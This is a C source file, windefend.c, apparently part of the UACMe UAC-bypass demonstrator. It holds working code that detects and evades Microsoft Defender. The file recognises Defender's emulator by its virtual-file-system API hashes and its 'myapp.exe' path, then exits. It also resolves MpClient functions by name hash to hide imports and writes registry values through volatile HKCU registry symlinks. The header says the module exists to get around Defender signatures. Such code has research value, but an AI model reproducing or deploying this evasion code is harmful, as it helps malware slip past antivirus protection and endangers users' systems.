/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2018
*
*  TITLE:       WINDEFEND.C
*
*  VERSION:     2.90
*
*  DATE:        10 July 2018
*
*  MSE / Windows Defender anti-emulation part.
*
*  WARNING: Kernel32/ntdll only dependencies.
*
*  Short FAQ:
*
*  Q: Why this module included in UACMe,
*     I thought this is demonstrator tool not real malware?
*
*  A: WinDefender is a default AV software installed on every Windows
*     since Windows 8. Because some of the lazy malware authors copy-pasted
*     whole UACMe project in their crappiest malware WinDefender has
*     several signatures to detect UACMe and it components.
*     Example of WinDefend signature: Bampeass. We cannot be prevented by this
*     as this demonstrator must be running on newest Windows OS versions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "shared.h"

#define WD_REG_LINK L"\\Software\\KureND"

#define WDSTATUS_HASH               0x5ED47491
#define MPMANAGEROPEN_HASH          0x156DB96C
#define MPHANDLECLOSE               0x1117328A
#define MPERRORMESSAGEFORMAT_HASH   0xCA83DF68
#define MPMANAGERVERSIONQUERY_HASH  0x16F1FB24

/*
//MpThreatOpen
//MpThreatEnumerate
//MpFreeMemory
//incomplete, future use
*/

#define WD_HASH_TABLE_ITEMS 21

DWORD wdEmulatorAPIHashTable[] = {
    0x3E3CBE69, //VFS_CopyFile
    0x00633A7F, //VFS_DeleteFile
    0x331245AB, //VFS_DeleteFileByHandle
    0xE0A858CF, //VFS_FileExists
    0xDC54FFE2, //VFS_FindClose
    0x1C920626, //VFS_FindFirstFile
    0xAA3ABE29, //VFS_FindNextFile
    0xBAC05205, //VFS_FlushViewOfFile
    0xDB9EFF5A, //VFS_GetAttrib
    0xDBB23222, //VFS_GetHandle
    0xDBA02E4A, //VFS_GetLength
    0xEB0B0115, //VFS_MapViewOfFile
    0x302ABE69, //VFS_MoveFile
    0x5F831879, //VFS_Open
    0x5F82E329, //VFS_Read
    0x7B9EFF5A, //VFS_SetAttrib
    0x5DC47852, //VFS_SetCurrentDir
    0x7BA02E4A, //VFS_SetLength
    0xBAC23515, //VFS_UnmapViewOfFile
    0xFC14FE63, //VFS_Write
    0xD4908D6E  //NtControlChannel
};

/*
* wdxGetHashForString
*
* Purpose:
*
* Calculates specific hash for string.
*
*/
DWORD wdxGetHashForString(
    _In_ char *s
)
{
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

/*
* wdxGetProcedureAddressByHash
*
* Purpose:
*
* Return pointer to function in MpClient from name hash value.
*
*/
PVOID wdxGetProcedureAddressByHash(
    _In_ PVOID MpClientBase,
    _In_ ULONG ProcedureHash
)
{
    DWORD i;
    ULONG sz = 0;

    IMAGE_DOS_HEADER *DosHeader;
    IMAGE_EXPORT_DIRECTORY *Exports;
    PDWORD Names, Functions;
    PWORD Ordinals;

    DWORD_PTR FunctionPtr;

    DosHeader = (IMAGE_DOS_HEADER*)MpClientBase;

    Exports = RtlImageDirectoryEntryToData(MpClientBase, TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);

    if (Exports == NULL)
        return NULL;

    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);
    Ordinals = (PWORD)((PBYTE)DosHeader + Exports->AddressOfNameOrdinals);
    Functions = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfFunctions);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        if (wdxGetHashForString((char *)((PBYTE)DosHeader + Names[i])) == ProcedureHash) {
            FunctionPtr = Functions[Ordinals[i]];
            return (PBYTE)MpClientBase + FunctionPtr;
        }
    }

    return NULL;
}

/*
* wdLoadAndQueryState
*
* Purpose:
*
* Load mpengine client dll, retrieve Windows Defender state.
* If MpClientBase specified then routine will return client image base otherwise client dll will be unloaded.
*
* Return values:
*
*   STATUS_NOTHING_TO_TERMINATE - general status, error query WD state, WD maybe be not present.
*   STATUS_NO_SECRETS - WD present and disabled.
*   STATUS_TOO_MANY_SECRETS - WD present and enabled.
*   Any other status indicate error.
*
* Limitations:
*
*   Warning: This routine will produce incorrect results under MS AV emulator.
*
*/
NTSTATUS wdLoadAndQueryState(
    _In_ BOOL IsWow64,
    _Out_opt_ PVOID *MpClientBase
)
{
    BOOL        bFound = FALSE, bEnabled = FALSE;
    HANDLE      hHeap = NtCurrentPeb()->ProcessHeap;
    PVOID       ImageBase = NULL;
    NTSTATUS    status = STATUS_NOTHING_TO_TERMINATE;
    HRESULT     hResult;

    pfnWDStatus WDStatus = NULL;

    PWCHAR EnvironmentBlock = NtCurrentPeb()->ProcessParameters->Environment;
    PWCHAR ptr, lpProgramFiles, lpBuffer;

    UNICODE_STRING usTemp, *us;

    SIZE_T memIO;

    UNICODE_STRING us1 = RTL_CONSTANT_STRING(L"ProgramFiles=");
    UNICODE_STRING us2 = RTL_CONSTANT_STRING(L"ProgramFiles(x86)=");

    us = &us1;

    if (IsWow64)
        us = &us2;

    ptr = EnvironmentBlock;

    do {
        if (*ptr == 0)
            break;

        RtlSecureZeroMemory(&usTemp, sizeof(usTemp));
        RtlInitUnicodeString(&usTemp, ptr);
        if (RtlPrefixUnicodeString(us, &usTemp, TRUE)) {
            bFound = TRUE;
            break;
        }

        ptr += _strlen(ptr) + 1;

    } while (1);

    if (!bFound) {
        
        if (MpClientBase)
            *MpClientBase = NULL;

        return status;
    }

    lpProgramFiles = (ptr + us->Length / sizeof(WCHAR));

    memIO = (MAX_PATH + _strlen(lpProgramFiles)) * sizeof(WCHAR);
    lpBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
    if (lpBuffer) {
        _strcpy(lpBuffer, lpProgramFiles);
        _strcat(lpBuffer, TEXT("\\Windows Defender\\MpClient.dll"));

        RtlInitUnicodeString(&usTemp, lpBuffer);

        status = LdrLoadDll(NULL, NULL, &usTemp, &ImageBase);
        if (NT_SUCCESS(status)) {           

            WDStatus = wdxGetProcedureAddressByHash(ImageBase, WDSTATUS_HASH);
            if (WDStatus) {
                hResult = WDStatus(&bEnabled);
                if (SUCCEEDED(hResult))
                    if (bEnabled)
                        status = STATUS_TOO_MANY_SECRETS;
                    else
                        status = STATUS_NO_SECRETS;
            }

            //
            // Return client dll imagebase of requested, otherwise unload dll.
            //
            if (MpClientBase)
                *MpClientBase = ImageBase;
            else
                LdrUnloadDll(ImageBase);

        }
        RtlFreeHeap(hHeap, 0, lpBuffer);
    }
    else
        status = STATUS_MEMORY_NOT_ALLOCATED;

    return status;
}

/*
* wdCheckEmulatedVFS
*
* Purpose:
*
* Detect Microsoft Security Engine emulation by it own VFS artefact.
*
* Microsoft AV provides special emulated environment for scanned application where it
* fakes general system information, process environment structures/data to make sure
* API calls are transparent for scanned code. It also use simple Virtual File System
* allowing this AV track file system changes and if needed continue emulation on new target.
*
* This method implemented in commercial malware presumable since 2013.
*
*/
VOID wdCheckEmulatedVFS(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH];
    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    GetModuleFileName(NULL, szBuffer, MAX_PATH);
    if (_strstri(szBuffer, szMsEngVFS) != NULL) {
        ExitProcess((UINT)0);
    }
}

/*
* wdIsEmulatorPresent
*
* Purpose:
*
* Detect MS emulator state.
*
*/
NTSTATUS wdIsEmulatorPresent(
    VOID)
{
    PCHAR ImageBase = NULL;

    IMAGE_DOS_HEADER *DosHeader;
    IMAGE_EXPORT_DIRECTORY *Exports;
    PDWORD Names;

    ULONG i, c, Hash, sz = 0;

    UNICODE_STRING usNtdll = RTL_CONSTANT_STRING(L"ntdll.dll");

    if (!NT_SUCCESS(LdrGetDllHandle(NULL, NULL, &usNtdll, &ImageBase)))
        return STATUS_DLL_NOT_FOUND;

    Exports = RtlImageDirectoryEntryToData(ImageBase, TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);

    if (Exports == NULL)
        return STATUS_INVALID_IMAGE_FORMAT;

    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;
    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        Hash = wdxGetHashForString((char *)((PBYTE)DosHeader + Names[i]));
        for (c = 0; c < WD_HASH_TABLE_ITEMS; c++) {
            if (Hash == wdEmulatorAPIHashTable[c])
                return STATUS_NEEDS_REMEDIATION;
        }
    }

    return STATUS_NOT_SUPPORTED;
}

/*
* wdRegSetValueIndirectHKCU
*
* Purpose:
*
* Indirectly set registry Value for TargetKey in the current user hive.
*
*/
NTSTATUS wdRegSetValueIndirectHKCU(
    _In_ LPWSTR TargetKey,
    _In_opt_ LPWSTR ValueName,
    _In_ LPWSTR lpData,
    _In_ ULONG cbData
)
{
    BOOL bCond = FALSE;
    HANDLE hKey = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    UNICODE_STRING usCurrentUser, usLinkPath;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING CmSymbolicLinkValue = RTL_CONSTANT_STRING(L"SymbolicLinkValue");

    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;

    SIZE_T memIO;

    PWSTR lpLinkKeyBuffer = NULL, lpBuffer = NULL;
    ULONG cbKureND = sizeof(WD_REG_LINK) - sizeof(WCHAR);
    ULONG dummy;

    status = RtlFormatCurrentUserKeyPath(&usCurrentUser);
    if (!NT_SUCCESS(status))
        return status;

    do {

        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + cbKureND;
        lpLinkKeyBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpLinkKeyBuffer == NULL)
            break;

        usLinkPath.Buffer = lpLinkKeyBuffer;
        usLinkPath.Length = 0;
        usLinkPath.MaximumLength = (USHORT)memIO;

        status = RtlAppendUnicodeStringToString(&usLinkPath, &usCurrentUser);
        if (!NT_SUCCESS(status))
            break;

        status = RtlAppendUnicodeToString(&usLinkPath, WD_REG_LINK);
        if (!NT_SUCCESS(status))
            break;

        InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

        //
        // Create link key.
        //
        status = NtCreateKey(&hKey, KEY_ALL_ACCESS,
            &obja, 0, NULL,
            REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
            &dummy);

        //
        // If link already created, update it.
        //
        if (status == STATUS_OBJECT_NAME_COLLISION) {

            obja.Attributes |= OBJ_OPENLINK;

            status = NtOpenKey(&hKey,
                KEY_ALL_ACCESS,
                &obja);

        }

        if (!NT_SUCCESS(status))
            break;

        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + ((1 + _strlen(TargetKey)) * sizeof(WCHAR));
        lpBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpBuffer == NULL)
            break;

        _strcpy(lpBuffer, usCurrentUser.Buffer);
        _strcat(lpBuffer, L"\\");
        _strcat(lpBuffer, TargetKey);

        memIO = _strlen(lpBuffer) * sizeof(WCHAR); //no null termination
        status = NtSetValueKey(hKey, &CmSymbolicLinkValue, 0, REG_LINK, (PVOID)lpBuffer, (ULONG)memIO);
        NtClose(hKey);
        hKey = NULL;

        if (!NT_SUCCESS(status))
            break;

        //
        // Set value indirect.
        //
        obja.Attributes = OBJ_CASE_INSENSITIVE;
        status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
        if (NT_SUCCESS(status)) {

            //
            // If this is Default value - supply empty US.
            //
            if (ValueName == NULL) {
                RtlSecureZeroMemory(&usLinkPath, sizeof(usLinkPath));
            }
            else {
                RtlInitUnicodeString(&usLinkPath, ValueName);
            }
            status = NtSetValueKey(hKey, &usLinkPath, 0, REG_SZ, (PVOID)lpData, (ULONG)cbData);
            NtClose(hKey);
            hKey = NULL;
        }

    } while (bCond);

    if (lpLinkKeyBuffer) RtlFreeHeap(hHeap, 0, lpLinkKeyBuffer);
    if (lpBuffer) RtlFreeHeap(hHeap, 0, lpBuffer);
    if (hKey) NtClose(hKey);
    RtlFreeUnicodeString(&usCurrentUser);

    return status;
}

/*
* wdRemoveRegLinkHKCU
*
* Purpose:
*
* Remove registry symlink for current user.
*
*/
NTSTATUS wdRemoveRegLinkHKCU(
    VOID
)
{
    BOOL bCond = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    ULONG cbKureND = sizeof(WD_REG_LINK) - sizeof(WCHAR);

    UNICODE_STRING usCurrentUser, usLinkPath;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING CmSymbolicLinkValue = RTL_CONSTANT_STRING(L"SymbolicLinkValue");

    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;

    PWSTR lpLinkKeyBuffer = NULL;
    SIZE_T memIO;

    HANDLE hKey = NULL;

    InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = RtlFormatCurrentUserKeyPath(&usCurrentUser);
    if (!NT_SUCCESS(status))
        return status;

    do {

        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + cbKureND;
        lpLinkKeyBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpLinkKeyBuffer == NULL)
            break;

        usLinkPath.Buffer = lpLinkKeyBuffer;
        usLinkPath.Length = 0;
        usLinkPath.MaximumLength = (USHORT)memIO;

        status = RtlAppendUnicodeStringToString(&usLinkPath, &usCurrentUser);
        if (!NT_SUCCESS(status))
            break;

        status = RtlAppendUnicodeToString(&usLinkPath, WD_REG_LINK);
        if (!NT_SUCCESS(status))
            break;

        InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE | OBJ_OPENLINK, NULL, NULL);

        status = NtOpenKey(&hKey,
            KEY_ALL_ACCESS,
            &obja);

        if (NT_SUCCESS(status)) {

            status = NtDeleteValueKey(hKey, &CmSymbolicLinkValue);
            if (NT_SUCCESS(status))
                status = NtDeleteKey(hKey);

            NtClose(hKey);
        }

    } while (bCond);

    if (lpLinkKeyBuffer) RtlFreeHeap(hHeap, 0, lpLinkKeyBuffer);
    RtlFreeUnicodeString(&usCurrentUser);

    return status;
}

NTSTATUS wdSelfTraverse(
    _In_ PVOID MpClientBase)
{
    UNREFERENCED_PARAMETER(MpClientBase);
    return STATUS_NOT_IMPLEMENTED;
}
